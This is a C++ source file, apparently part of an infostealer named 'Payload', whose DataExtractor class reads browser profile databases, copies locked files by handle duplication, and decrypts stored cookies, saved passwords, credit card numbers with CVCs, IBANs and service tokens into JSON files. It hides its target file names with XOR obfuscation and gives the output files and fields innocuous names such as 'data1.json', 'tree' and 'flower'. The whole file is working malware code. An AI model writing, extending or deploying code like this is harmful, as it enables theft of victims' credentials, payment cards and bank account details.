#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>
namespace Payload {
    // Strings obfusquées (XOR 0xAA)
    static inline std::string DecodeStr(const char* encoded, size_t len) {
        std::string result;
        result.reserve(len);
        for (size_t i = 0; i < len; ++i) {
            result += encoded[i] ^ 0xAA;
        }
        return result;
    }
    static const char STR_COOKIES_JSON[] = {
        0xce, 0xcb, 0xde, 0xcb, 0x9b, 0x84, 0xc0, 0xd9, 0xc5, 0xc4, 0x00  // data1.json
    };
    static const char STR_PASSWORDS_JSON[] = {
        0xce, 0xcb, 0xde, 0xcb, 0x9c, 0x84, 0xc0, 0xd9, 0xc5, 0xc4, 0x00  // data2.json
    };
    static const char STR_PASSWORDS_ACCOUNT_JSON[] = {
        0xce, 0xcb, 0xde, 0xcb, 0x9c, 0xf5, 0xcb, 0xc6, 0xde, 0x84, 0xc0, 0xd9, 0xc5, 0xc4, 0x00  // data2_alt.json
    };
    static const char STR_CARDS_JSON[] = {
        0xce, 0xcb, 0xde, 0xcb, 0x9d, 0x84, 0xc0, 0xd9, 0xc5, 0xc4, 0x00  // data3.json
    };
    static const char STR_IBAN_JSON[] = {
        0xce, 0xcb, 0xde, 0xcb, 0x9e, 0x84, 0xc0, 0xd9, 0xc5, 0xc4, 0x00  // data4.json
    };
    static const char STR_TOKENS_JSON[] = {
        0xce, 0xcb, 0xde, 0xcb, 0x9f, 0x84, 0xc0, 0xd9, 0xc5, 0xc4, 0x00  // data5.json
    };
    static const char STR_NETWORK[] = {
        0xe4, 0xcf, 0xde, 0xdd, 0xc5, 0xd8, 0xc1, 0x00
    };
    static const char STR_COOKIES_DB[] = {
        0xe9, 0xc5, 0xc5, 0xc1, 0xc3, 0xcf, 0xd9, 0x00
    };
    static const char STR_LOGIN_DATA[] = {
        0xe6, 0xc5, 0xcd, 0xc3, 0xc4, 0x8a, 0xee, 0xcb, 0xde, 0xcb, 0x00
    };
    static const char STR_LOGIN_ACCOUNT[] = {
        0xe6, 0xc5, 0xcd, 0xc3, 0xc4, 0x8a, 0xee, 0xcb, 0xde, 0xcb, 0x8a, 0xec,
        0xc5, 0xd8, 0x8a, 0xeb, 0xc9, 0xc9, 0xc5, 0xdf, 0xc4, 0xde, 0x00
    };
    static const char STR_WEB_DATA[] = {
        0xfd, 0xcf, 0xc8, 0x8a, 0xee, 0xcb, 0xde, 0xcb, 0x00
    };
    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {}
    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        std::string uri = "file:" + dbPath.string() + "?nolock=1";
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }
    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        sqlite3* db = OpenDatabase(dbPath);
        if (db) {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    sqlite3_finalize(stmt);
                    return db;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            db = nullptr;
        }
        HandleDuplicator duplicator;
        auto tempDir = m_outputBase / ".temp";
        auto tempDbPath = duplicator.CopyLockedFile(dbPath, tempDir);
        if (!tempDbPath) {
            return nullptr;
        }
        m_tempFiles.push_back(*tempDbPath);
        return OpenDatabase(*tempDbPath);
    }
    void DataExtractor::CleanupTempFiles() {
        for (const auto& tempFile : m_tempFiles) {
            try {
                if (std::filesystem::exists(tempFile)) {
                    std::filesystem::remove(tempFile);
                }
            } catch (...) {
                // Ignore cleanup failures
            }
        }
        m_tempFiles.clear();
        try {
            auto tempDir = m_outputBase / ".temp";
            if (std::filesystem::exists(tempDir) && std::filesystem::is_empty(tempDir)) {
                std::filesystem::remove(tempDir);
            }
        } catch (...) {}
    }
    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        m_pipe.Log("PROFILE:" + profilePath.filename().string());
        try {
            auto cookiePath = profilePath / DecodeStr(STR_NETWORK, sizeof(STR_NETWORK) - 1).c_str() / DecodeStr(STR_COOKIES_DB, sizeof(STR_COOKIES_DB) - 1).c_str();
            if (std::filesystem::exists(cookiePath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                    ExtractCookies(db, m_outputBase / browserName / profilePath.filename() / DecodeStr(STR_COOKIES_JSON, sizeof(STR_COOKIES_JSON) - 1).c_str());
                    sqlite3_close(db);
                }
            }
        } catch(...) {}
        try {
            auto loginPath = profilePath / DecodeStr(STR_LOGIN_DATA, sizeof(STR_LOGIN_DATA) - 1).c_str();
            if (std::filesystem::exists(loginPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / DecodeStr(STR_PASSWORDS_JSON, sizeof(STR_PASSWORDS_JSON) - 1).c_str());
                    sqlite3_close(db);
                }
            }
        } catch(...) {}
        try {
            auto loginAccountPath = profilePath / DecodeStr(STR_LOGIN_ACCOUNT, sizeof(STR_LOGIN_ACCOUNT) - 1).c_str();
            if (std::filesystem::exists(loginAccountPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(loginAccountPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / DecodeStr(STR_PASSWORDS_ACCOUNT_JSON, sizeof(STR_PASSWORDS_ACCOUNT_JSON) - 1).c_str());
                    sqlite3_close(db);
                }
            }
        } catch(...) {}
        try {
            auto webDataPath = profilePath / DecodeStr(STR_WEB_DATA, sizeof(STR_WEB_DATA) - 1).c_str();
            if (std::filesystem::exists(webDataPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                    ExtractCards(db, m_outputBase / browserName / profilePath.filename() / DecodeStr(STR_CARDS_JSON, sizeof(STR_CARDS_JSON) - 1).c_str());
                    ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / DecodeStr(STR_IBAN_JSON, sizeof(STR_IBAN_JSON) - 1).c_str());
                    ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / DecodeStr(STR_TOKENS_JSON, sizeof(STR_TOKENS_JSON) - 1).c_str());
                    sqlite3_close(db);
                }
            }
        } catch(...) {}
        CleanupTempFiles();
    }
    void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
        std::vector<std::string> entries;
        int total = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            total++;
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                if (decrypted && !decrypted->empty()) {
                    std::string val;
                    if (decrypted->size() > 32) {
                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    } else {
                        val = std::string((char*)decrypted->data(), decrypted->size());
                    }
                    std::stringstream ss;
                    ss << "{\"domain\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"key\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"route\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 2)) << "\","
                       << "\"secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false") << ","
                       << "\"httponly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false") << ","
                       << "\"exp\":" << sqlite3_column_int64(stmt, 5) << ","
                       << "\"data\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);
        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            // Structured message: COOKIES:extracted:total
            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
        }
    }
    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int blobLen = sqlite3_column_bytes(stmt, 2);
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                if (decrypted) {
                    std::string val((char*)decrypted->data(), decrypted->size());
                    std::stringstream ss;
                    ss << "{\"site\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"tree\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"flower\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);
        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
        }
    }
    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        // 1. Load CVCs
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }
        // 2. Extract Cards
        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;
        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int len = sqlite3_column_bytes(stmt, 4);
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string num((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
                    std::stringstream ss;
                    ss << "{\"owner\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"exp_m\":" << sqlite3_column_int(stmt, 2) << ","
                       << "\"exp_y\":" << sqlite3_column_int(stmt, 3) << ","
                       << "\"digits\":\"" << EscapeJson(num) << "\","
                       << "\"code\":\"" << EscapeJson(cvc) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);
        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
        }
    }
    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;
        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int len = sqlite3_column_bytes(stmt, 0);
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::stringstream ss;
                    ss << "{\"label\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"account\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);
        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }
    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        bool hasBindingKey = true;
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
            hasBindingKey = false;
            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
        }
        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int len = sqlite3_column_bytes(stmt, 1);
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::string bindingKey = "";
                    if (hasBindingKey) {
                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
                        int bKeyLen = sqlite3_column_bytes(stmt, 2);
                        if (bKeyBlob && bKeyLen > 0) {
                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
                            if (decKey) {
                                bindingKey = std::string((char*)decKey->data(), decKey->size());
                            }
                        }
                    }
                    std::stringstream ss;
                    ss << "{\"provider\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"access\":\"" << EscapeJson(val) << "\","
                       << "\"bind\":\"" << EscapeJson(bindingKey) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);
        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
        }
    }
    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }
}